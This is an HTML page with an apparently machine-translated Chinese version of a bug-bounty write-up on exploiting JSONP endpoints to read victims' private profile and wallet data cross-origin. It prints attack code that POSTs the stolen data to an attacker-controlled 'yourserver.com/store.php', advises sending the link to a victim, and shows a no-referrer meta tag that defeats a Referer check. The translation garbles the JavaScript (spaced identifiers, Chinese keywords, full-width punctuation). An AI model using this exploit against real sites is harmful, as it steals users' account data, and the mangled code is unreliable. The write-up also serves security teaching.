<html>
<head>
<title>Exploiting JSONP and Bypassing Referer Check</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">利用JSONP并绕过Referer检查</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-jsonp-and-bypassing-referer-check-2d6e40dfa24?source=collection_archive---------0-----------------------#2019-09-07">https://infosecwriteups.com/exploiting-jsonp-and-bypassing-referer-check-2d6e40dfa24?source=collection_archive---------0-----------------------#2019-09-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="2f54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">嗨<strong class="jp ir">伙计们</strong>，希望你们都很好，所以这篇文章是关于利用JSONP从API端点提取私有数据并绕过服务器的安全检查。</p><p id="5328" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> JSONP </strong>是<strong class="jp ir"> ( </strong>带填充的JSON)，JSONP的创建是为了授予对JavaScript的跨起源读访问，它作为<strong class="jp ir"> SOP ( </strong>同源策略<strong class="jp ir"> ) </strong>的例外，允许跨起源的数据访问。可用于绕过<strong class="jp ir"> SOP </strong>访问跨原点数据。</p><p id="e69e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们看看它是如何工作的。</p><p id="972e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">返回数据的<strong class="jp ir"> API </strong>端点被用在一个带有回调函数的脚本标签中，就像这样。</p><blockquote class="kl km kn"><p id="607b" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><script src="”https://redact.com/api/user/profile?callback=call_me”">T15】&lt;/root&gt;</script></p></blockquote><p id="20be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们需要创建一个回调函数，我们已经在脚本标签<strong class="jp ir">src(</strong>https://redact.com/api/user/profile?callback=<strong class="jp ir">call _ me)</strong>中传递了这个函数，你可以给它起任何名字，我已经给它起了名字<strong class="jp ir"> call_me。</strong></p><blockquote class="kl km kn"><p id="febd" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><script>函数call _ me(data){ console . log(data)}&lt;/root&gt;</script></p></blockquote><p id="ff5d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，代码将如下所示。首先，我们将创建回调函数，然后我们将创建<strong class="jp ir">脚本</strong>标签。</p><blockquote class="kl km kn"><p id="c74f" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><script>函数call _ me(data){ console . log(data)}</script></p><p id="350b" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><script src="”https://redact.com/api/user/profile?callback=call_me”"> </script></p></blockquote><p id="ecc6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该代码将在浏览器<strong class="jp ir">控制台中记录数据。</strong></p><p id="7106" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们如何验证<strong class="jp ir"> API </strong>易受这个<strong class="jp ir"> JSONP </strong>漏洞的攻击。</p><p id="29bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">例如，我们有一个端点，它显示用户钱包数据<a class="ae ks" href="https://user.redact.com/payment/wallet/balance" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir"><em class="ko"/></strong></a></p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="kz la di lb bf lc"><div class="gh gi kt"><img src="../Images/82364163351b45d6bafd94e26b525c86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1euU-nfdxgtBGF7O6oNTgw.jpeg"/></div></div></figure><p id="a8e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在添加一个这样回调的查询参数，<a class="ae ks" href="https://user.redact.com/payment/wallet/balance?callback=call_me" rel="noopener ugc nofollow" target="_blank">【https://user.redact.com/payment/wallet/balance?】<em class="ko">回调=call_me </em>  </a></p><p id="cace" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果端点启用了<strong class="jp ir"> JSONP </strong>，它将创建一个名为<strong class="jp ir"> call_me </strong>的对象，所有数据都在该对象中，如下所示。</p><figure class="ku kv kw kx gt ky gh gi paragraph-image"><div role="button" tabindex="0" class="kz la di lb bf lc"><div class="gh gi lf"><img src="../Images/b57bc7c2ccc1fa7c4894d27d207559c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-pfPrUZeXEqXJqGT55wRFQ.jpeg"/></div></div></figure><p id="aadc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这证实了端点支持<strong class="jp ir"> JSONP </strong>并且可以被利用，现在我们将使用我之前解释过的相同的JavaScript代码。</p><blockquote class="kl km kn"><p id="83eb" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><script>函数call _ me(data){ console . log(data)}</script></p><p id="a254" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><script src="”https://redact.com/api/user/profile?callback=call_me”">T56】&lt;/root&gt;</script></p></blockquote><p id="d0d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在你也可以创建一个<strong class="jp ir">。html文件</strong>，它将提取数据并存储在您想要的服务器上。你只需要把URL发送给受害者，然后你可以写你自己的JavaScript代码把数据发送到你的服务器，就像这样。</p><blockquote class="kl km kn"><p id="6901" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><script/></p><p id="93c7" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">函数call _ me(response){<br/>var http = new XMLHttpRequest()；【https://yourserver.com/store.php'】var URL = '<a class="ae ks" href="https://yourserver.com/store.php'" rel="noopener ugc nofollow" target="_blank">T4</a>；<br/>var params = ' data = '+JSON . stringify(response)；</p><p id="f923" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">http.open('POST '，url，true)；</p><p id="ff94" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">http . setrequestheader(' Content-type '，' application/x-www-form-urlencoded ')；</p><p id="5614" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">http . onreadystatechange = function(){<br/>if(http . ready state = = 4&amp;&amp;http . status = = 200){<br/>console . log(http . responsetext)；<br/>}<br/>}<br/>http . send(params)；<br/> }</p><p id="858c" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"> <br/> &lt;脚本src = "<a class="ae ks" href="https://user.gearbest.com/api/user/profile?callback=call_me" rel="noopener ugc nofollow" target="_blank">https://user.redact.com/api/user/profile?callback=call_me</a>"&gt;&lt;/脚本&gt;</p></blockquote><h1 id="e3b1" class="lg lh iq bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">绕过推荐人检查</h1><p id="ab26" class="pw-post-body-paragraph jn jo iq jp b jq me js jt ju mf jw jx jy mg ka kb kc mh ke kf kg mi ki kj kk ij bi translated">最后一件事，最近我发现一个<strong class="jp ir"> API </strong>端点容易受到<strong class="jp ir"> JSONP </strong>攻击，使用回调函数获取数据的代码工作正常，当我从我的PC本地运行来自<strong class="jp ir"> file:// </strong>的代码时，我正在获取数据。但是当我把文件上传到网络服务器上时，我得到的是一个错误的<strong class="jp ir">对象</strong>，而不是带有错误的<strong class="jp ir">认证</strong>和一个<strong class="jp ir">重定向URL </strong>到网站的登录页面的数据。</p><p id="99c0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是在几个小时尝试不同的事情和抓我的头发后，我终于明白了这只是服务器的一个简单的安全检查，服务器正在检查<strong class="jp ir"> Referer </strong>头，如果<strong class="jp ir"> Referer头</strong>值包含一个<strong class="jp ir">跨域</strong>，服务器拒绝请求。</p><p id="1ab3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么，当我在本地运行文件时，我是如何获取数据的呢？答案是，当您在本地运行文件时，不会发送<strong class="jp ir"> Referer </strong>标头，因为它是从您自己的系统本地运行的，但是当您在服务器上上传文件时，<strong class="jp ir"> Referer </strong>标头也会随请求一起发送，以标识请求的来源。</p><p id="0e64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，为了绕过这个安全检查，我只需移除<strong class="jp ir"> Referer </strong>标头。</p><p id="e258" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用了<strong class="jp ir"> HTML </strong> meta标签，它限制浏览器发送<strong class="jp ir"> Referer </strong>头，它是:</p><blockquote class="kl km kn"><p id="2f0c" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><meta name="”referrer”" content="”no-referrer”"/></p></blockquote><p id="63ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以在<strong class="jp ir"> HTML </strong> head标签中添加这个meta标签就完成了任务。</p><blockquote class="kl km kn"><p id="5726" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><head>T50</head></p><p id="cabb" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><script/></p><p id="f8bd" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">函数call _ me(response){<br/>var http = new XMLHttpRequest()；<br/>var URL = '【https://yourserver.com/store.php'】T2；<br/>var params = ' data = '+JSON . stringify(response)；</p><p id="17de" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">http.open('POST '，url，true)；</p><p id="e493" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">http . setrequestheader(' Content-type '，' application/x-www-form-urlencoded ')；</p><p id="9a22" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">http . onreadystatechange = function(){<br/>if(http . ready state = = 4&amp;&amp;http . status = = 200){<br/>console . log(http . responsetext)；<br/>}<br/>}<br/>http . send(params)；<br/> }</p><p id="fa5a" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><br/>&lt;script src = " https://user . redact . com/API/user/profile？回调= call _ me "&gt;&lt;/脚本&gt;</p></blockquote><p id="75dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您的阅读。</p></div><div class="ab cl mj mk hu ml" role="separator"><span class="mm bw bk mn mo mp"/><span class="mm bw bk mn mo mp"/><span class="mm bw bk mn mo"/></div><div class="ij ik il im in"><p id="1024" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ko">关注</em> <a class="ae ks" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ko"> Infosec报道</em> </a> <em class="ko">获取更多此类精彩报道。</em></p><div class="mq mr gp gr ms mt"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="mu ab fo"><div class="mv ab mw cl cj mx"><h2 class="bd ir gy z fp my fr fs mz fu fw ip bi translated">信息安全报道</h2><div class="na l"><h3 class="bd b gy z fp my fr fs mz fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="nb l"><p class="bd b dl z fp my fr fs mz fu fw dk translated">medium.com</p></div></div><div class="nc l"><div class="nd l ne nf ng nc nh ld mt"/></div></div></a></div></div></div>    
</body>
</html>